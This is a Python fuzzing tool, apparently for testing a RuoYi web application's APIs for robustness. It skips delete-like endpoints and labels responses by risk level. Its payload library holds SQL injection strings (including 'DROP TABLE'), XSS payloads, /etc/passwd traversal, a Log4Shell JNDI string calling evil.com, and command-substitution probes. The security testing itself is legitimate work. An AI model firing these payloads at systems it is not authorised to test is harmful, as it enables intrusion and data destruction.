import json
import requests
import time
import random
import string
import os
from datetime import datetime
from typing import Dict, List, Any

class FuzzingTester:
    def __init__(self, config_path: str = "project_config.json", apis_path: str = "apis.json"):
        self.config_path = config_path
        self.apis_path = apis_path
        self.results = []
        self.session = requests.Session()
        self.base_url = ""
        self.token = ""
        self.work_dir = "."
        
        # 模糊测试payload库
        self.fuzz_payloads = {
            'sql_injection': [
                "' OR '1'='1",
                "'; DROP TABLE users; --",
                "' UNION SELECT * FROM users--",
                "admin'--",
                "1' OR 1=1#",
                "' OR 'x'='x",
                "' OR 1=1--",
                "') OR ('x'='x",
                "1 OR 1=1",
                "' OR ''='"
            ],
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>",
                "'><script>alert('XSS')</script>",
                "\"><script>alert('XSS')</script>",
                "<iframe src=javascript:alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "';alert('XSS');//"
            ],
            'special_chars': [
                "!@#$%^&*()",
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\cmd.exe",
                "${jndi:ldap://evil.com/a}",
                "{{7*7}}",
                "${{7*7}}",
                "#{7*7}",
                "`command`",
                "$(command)",
                "${command}"
            ],
            'boundary_values': [
                "2147483647",  # INT_MAX
                "2147483648",  # INT_MAX + 1
                "-2147483648", # INT_MIN
                "-2147483649", # INT_MIN - 1
                "999999999999999999999999999999",
                "-999999999999999999999999999999",
                "0",
                "-1",
                "1",
                "A" * 1000,  # 超长字符串
                "A" * 10000,
                "",  # 空字符串
                "null",
                "undefined",
                "true",
                "false"
            ],
            'format_bypass': [
                "../",
                "..\\",
                "%2e%2e%2f",  # URL编码的../
                "%2e%2e%5c",  # URL编码的..\\
                "%252e%252e%252f",  # 双重编码
                "....//",
                "....\\\\",
                "/./",
                "/../",
                "\\.\\",
                "\\..\\"
            ]
        }
        
    def load_config(self) -> bool:
        """加载配置文件"""
        try:
            with open(self.config_path, 'r', encoding='utf-8') as f:
                config = json.load(f)
            self.base_url = f"http://{config.get('base_url', '')}"
            self.token = config.get('auth_token', '')
            self.work_dir = config.get('work_dir', '.')
            
            if not self.token:
                print("[ERROR] 未找到有效Token，需要重新获取")
                return False
            return True
        except Exception as e:
            print(f"[ERROR] 加载配置文件失败: {str(e)}")
            return False
    
    def load_apis(self) -> List[Dict]:
        """加载API列表"""
        try:
            with open(self.apis_path, 'r', encoding='utf-8') as f:
                apis = json.load(f)
            print(f"[INFO] 成功加载 {len(apis)} 个API接口")
            return apis
        except Exception as e:
            print(f"[ERROR] 加载API列表失败: {str(e)}")
            return []
    
    def setup_session(self):
        """设置请求会话"""
        self.session.headers.update({
            'Authorization': f'Bearer {self.token}',
            'Content-Type': 'application/json',
            'User-Agent': 'RuoYi-Fuzz-Tester/1.0'
        })
    
    def is_high_risk_method(self, method: str, path: str) -> bool:
        """判断是否为高风险方法，需要跳过模糊测试"""
        method_upper = method.upper()
        path_lower = path.lower()
        
        # 高风险HTTP方法
        if method_upper in ['DELETE']:
            return True
            
        # 高风险路径关键词
        risk_keywords = [
            'delete', 'remove', 'drop', 'truncate', 'clear', 'clean',
            'destroy', 'erase', 'wipe', 'purge', 'kill'
        ]
        
        for keyword in risk_keywords:
            if keyword in path_lower:
                return True
                
        return False
    
    def generate_intelligent_fuzz_payload(self, api: Dict) -> List[Any]:
        """生成智能模糊测试载荷"""
        method = api.get('method', '').upper()
        params = api.get('params', [])
        payloads = []
        
        # 基础有效载荷
        base_payload = {}
        if method in ['POST', 'PUT'] and api.get('payload'):
            base_payload = api['payload'].get('example', {}).copy()
        
        # 1. 路径参数模糊测试
        for param in params:
            param_name = param.get('name', '')
            param_type = param.get('type', 'string')
            
            # 为每个参数生成多种模糊值
            if param_type == 'string':
                fuzz_values = (
                    self.fuzz_payloads['sql_injection'][:3] +
                    self.fuzz_payloads['xss'][:3] +
                    self.fuzz_payloads['special_chars'][:3] +
                    self.fuzz_payloads['boundary_values'][:3]
                )
            else:  # 数字类型
                fuzz_values = self.fuzz_payloads['boundary_values'][:5]
            
            for fuzz_value in fuzz_values:
                # 创建新的payload副本
                fuzzed_payload = base_payload.copy()
                fuzzed_payload['__fuzz_param__'] = {
                    'name': param_name,
                    'value': fuzz_value,
                    'type': 'path_param'
                }
                payloads.append(fuzzed_payload)
        
        # 2. 请求体模糊测试
        if base_payload:
            # SQL注入测试
            for key in base_payload:
                if isinstance(base_payload[key], str):
                    for sql_payload in self.fuzz_payloads['sql_injection'][:2]:
                        fuzzed_payload = base_payload.copy()
                        fuzzed_payload[key] = sql_payload
                        fuzzed_payload['__fuzz_param__'] = {
                            'name': key,
                            'value': sql_payload,
                            'type': 'sql_injection'
                        }
                        payloads.append(fuzzed_payload)
                
                # XSS测试
                if isinstance(base_payload[key], str):
                    for xss_payload in self.fuzz_payloads['xss'][:2]:
                        fuzzed_payload = base_payload.copy()
                        fuzzed_payload[key] = xss_payload
                        fuzzed_payload['__fuzz_param__'] = {
                            'name': key,
                            'value': xss_payload,
                            'type': 'xss'
                        }
                        payloads.append(fuzzed_payload)
                
                # 特殊字符测试
                if isinstance(base_payload[key], (str, int)):
                    for special_payload in self.fuzz_payloads['special_chars'][:2]:
                        fuzzed_payload = base_payload.copy()
                        fuzzed_payload[key] = special_payload
                        fuzzed_payload['__fuzz_param__'] = {
                            'name': key,
                            'value': special_payload,
                            'type': 'special_chars'
                        }
                        payloads.append(fuzzed_payload)
        
        # 3. 边界值测试
        if base_payload:
            for key in base_payload:
                for boundary_value in self.fuzz_payloads['boundary_values'][:3]:
                    fuzzed_payload = base_payload.copy()
                    fuzzed_payload[key] = boundary_value
                    fuzzed_payload['__fuzz_param__'] = {
                        'name': key,
                        'value': boundary_value,
                        'type': 'boundary_value'
                    }
                    payloads.append(fuzzed_payload)
        
        # 如果没有生成载荷，添加一个基础载荷
        if not payloads and base_payload:
            payloads.append(base_payload)
        
        return payloads[:10]  # 限制载荷数量，避免测试时间过长
    
    def fuzz_api(self, api: Dict) -> List[Dict]:
        """对单个API进行模糊测试"""
        results = []
        
        # 检查是否为高风险方法，跳过模糊测试
        if self.is_high_risk_method(api.get('method', ''), api.get('path', '')):
            result = {
                'api': api,
                'test_type': 'FUZZING',
                'timestamp': datetime.now().isoformat(),
                'fuzz_payload': None,
                'status_code': None,
                'biz_code': None,
                'biz_msg': None,
                'security_result': 'SKIPPED',
                'error': '高风险方法，跳过模糊测试',
                'risk_level': 'SAFE',
                'stack_trace': None
            }
            results.append(result)
            print(f"[SKIPPED] {api['method']} {api['path']}: 高风险方法，跳过模糊测试")
            return results
        
        # 生成模糊测试载荷
        fuzz_payloads = self.generate_intelligent_fuzz_payload(api)
        
        for i, fuzz_payload in enumerate(fuzz_payloads):
            result = {
                'api': api,
                'test_type': 'FUZZING',
                'timestamp': datetime.now().isoformat(),
                'fuzz_payload': fuzz_payload.get('__fuzz_param__'),
                'status_code': None,
                'biz_code': None,
                'biz_msg': None,
                'security_result': 'UNKNOWN',
                'error': None,
                'risk_level': 'SAFE',
                'stack_trace': None
            }
            
            try:
                method = api.get('method', '').upper()
                path = api.get('path', '')
                
                # 替换路径参数
                fuzzed_path = path
                params = api.get('params', [])
                for param in params:
                    param_name = param.get('name', '')
                    if f"{{{param_name}}}" in fuzzed_path:
                        # 如果有模糊测试的路径参数，使用模糊值
                        if (result['fuzz_payload'] and 
                            result['fuzz_payload']['type'] == 'path_param' and 
                            result['fuzz_payload']['name'] == param_name):
                            fuzz_value = result['fuzz_payload']['value']
                        else:
                            # 使用默认值
                            if 'Id' in param_name:
                                fuzz_value = '1'
                            elif 'Name' in param_name:
                                fuzz_value = 'admin'
                            else:
                                fuzz_value = 'test'
                        
                        fuzzed_path = fuzzed_path.replace(f"{{{param_name}}}", str(fuzz_value))
                
                full_url = f"{self.base_url}{fuzzed_path}"
                
                # 准备请求数据（移除内部标记）
                request_data = {k: v for k, v in fuzz_payload.items() if k != '__fuzz_param__'}
                
                print(f"[FUZZ][{i+1}/{len(fuzz_payloads)}] {method} {fuzzed_path}")
                
                # 发送模糊测试请求
                if method == 'GET':
                    response = self.session.get(full_url, params=request_data, timeout=10)
                elif method == 'POST':
                    response = self.session.post(full_url, json=request_data, timeout=10)
                elif method == 'PUT':
                    response = self.session.put(full_url, json=request_data, timeout=10)
                elif method == 'DELETE':
                    response = self.session.delete(full_url, timeout=10)
                else:
                    result['error'] = f"不支持的HTTP方法: {method}"
                    results.append(result)
                    continue
                
                result['status_code'] = response.status_code
                
                # 分析响应
                if response.status_code == 500:
                    # 服务器错误，可能存在漏洞
                    result['security_result'] = 'HIGH_RISK'
                    result['risk_level'] = 'HIGH_RISK'
                    result['error'] = '服务器内部错误 (500)'
                    
                    # 尝试提取堆栈信息
                    try:
                        error_data = response.json()
                        if 'stack' in str(error_data).lower() or 'trace' in str(error_data).lower():
                            result['stack_trace'] = str(error_data)[:500]  # 限制长度
                    except:
                        result['stack_trace'] = response.text[:500]
                        
                elif response.status_code == 200:
                    try:
                        response_data = response.json()
                        result['response_data'] = response_data
                        result['biz_code'] = response_data.get('code')
                        result['biz_msg'] = response_data.get('msg', '')
                        
                        # 检查是否有异常信息
                        response_str = str(response_data).lower()
                        if any(keyword in response_str for keyword in ['error', 'exception', 'stack', 'trace']):
                            result['security_result'] = 'MEDIUM_RISK'
                            result['risk_level'] = 'MEDIUM_RISK'
                            result['error'] = '响应包含异常信息'
                        else:
                            result['security_result'] = 'SAFE'
                            result['risk_level'] = 'SAFE'
                            
                    except json.JSONDecodeError:
                        # 非JSON响应，检查是否包含错误信息
                        response_text = response.text.lower()
                        if any(keyword in response_text for keyword in ['error', 'exception', 'stack']):
                            result['security_result'] = 'MEDIUM_RISK'
                            result['risk_level'] = 'MEDIUM_RISK'
                            result['error'] = '非JSON响应包含异常信息'
                        else:
                            result['security_result'] = 'SAFE'
                            result['risk_level'] = 'SAFE'
                else:
                    # 其他状态码
                    result['security_result'] = 'SAFE'
                    result['risk_level'] = 'SAFE'
                    result['error'] = f'请求被拒绝: HTTP {response.status_code}'
                    
            except requests.exceptions.RequestException as e:
                result['security_result'] = 'ERROR'
                result['error'] = f'请求异常: {str(e)}'
            except Exception as e:
                result['security_result'] = 'ERROR'
                result['error'] = f'模糊测试异常: {str(e)}'
            
            results.append(result)
            
            # 避免请求过快
            time.sleep(0.05)
        
        return results
    
    def run_fuzzing_tests(self) -> bool:
        """运行模糊测试"""
        print("[INFO] 开始执行健壮性模糊测试...")
        
        # 加载配置和API
        if not self.load_config():
            return False
        
        apis = self.load_apis()
        if not apis:
            return False
        
        self.setup_session()
        
        # 执行模糊测试
        high_risk_count = 0
        medium_risk_count = 0
        safe_count = 0
        skipped_count = 0
        error_count = 0
        
        for i, api in enumerate(apis, 1):
            print(f"\n[{i}/{len(apis)}] ", end='')
            api_results = self.fuzz_api(api)
            
            for result in api_results:
                self.results.append(result)
                
                if result['security_result'] == 'HIGH_RISK':
                    high_risk_count += 1
                    print(f"[HIGH_RISK] {api['method']} {api['path']}: {result.get('error', 'Unknown')}")
                elif result['security_result'] == 'MEDIUM_RISK':
                    medium_risk_count += 1
                    print(f"[MEDIUM_RISK] {api['method']} {api['path']}: {result.get('error', 'Unknown')}")
                elif result['security_result'] == 'SAFE':
                    safe_count += 1
                    print(f"[SAFE] {api['method']} {api['path']}: 模糊测试通过")
                elif result['security_result'] == 'SKIPPED':
                    skipped_count += 1
                    print(f"[SKIPPED] {api['method']} {api['path']}: 跳过高风险方法")
                else:
                    error_count += 1
                    print(f"[ERROR] {api['method']} {api['path']}: {result.get('error', 'Unknown')}")
        
        # 生成测试报告
        self.generate_report(high_risk_count, medium_risk_count, safe_count, skipped_count, error_count)
        
        # 保存结果
        return self.save_results()
    
    def generate_report(self, high_risk: int, medium_risk: int, safe: int, skipped: int, error: int):
        """生成测试报告"""
        total = high_risk + medium_risk + safe + skipped + error
        
        print(f"\n{'='*60}")
        print("健壮性模糊测试报告")
        print(f"{'='*60}")
        print(f"测试时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"总测试数: {total}")
        print(f"高危漏洞: {high_risk}")
        print(f"中风险: {medium_risk}")
        print(f"安全: {safe}")
        print(f"已跳过: {skipped}")
        print(f"错误: {error}")
        
        if high_risk > 0:
            print(f"\n[!] 发现 {high_risk} 个高危安全漏洞！")
            high_risk_results = [r for r in self.results if r.get('risk_level') == 'HIGH_RISK']
            for result in high_risk_results[:3]:  # 只显示前3个
                api = result['api']
                fuzz_info = result.get('fuzz_payload', {})
                print(f"  - {api['method']} {api['path']}: {result.get('error', 'Unknown')}")
                if fuzz_info:
                    print(f"    触发载荷: {fuzz_info.get('value', 'Unknown')}")
        print(f"{'='*60}")
    
    def save_results(self) -> bool:
        """保存测试结果"""
        try:
            output_file = os.path.join(self.work_dir, "results_fuzzing.json")
            
            # 脱敏处理：替换Token
            results_for_save = []
            for result in self.results:
                result_copy = result.copy()
                if 'Authorization' in str(result_copy):
                    result_copy = str(result_copy).replace(self.token, '<REDACTED>')
                results_for_save.append(result_copy)
            
            with open(output_file, 'w', encoding='utf-8') as f:
                json.dump(results_for_save, f, indent=2, ensure_ascii=False)
            
            print(f"[SUCCESS] 测试结果已保存至: {output_file}")
            return True
            
        except Exception as e:
            print(f"[ERROR] 保存测试结果失败: {str(e)}")
            return False

def main():
    """主函数"""
    print("[WARNING] 仅限授权测试！开始健壮性模糊测试...")
    print("=" * 60)
    
    tester = FuzzingTester()
    success = tester.run_fuzzing_tests()
    
    if success:
        print("\n[SUCCESS] 健壮性模糊测试完成！")
        return True
    else:
        print("\n[ERROR] 健壮性模糊测试失败！")
        return False

if __name__ == "__main__":
    main()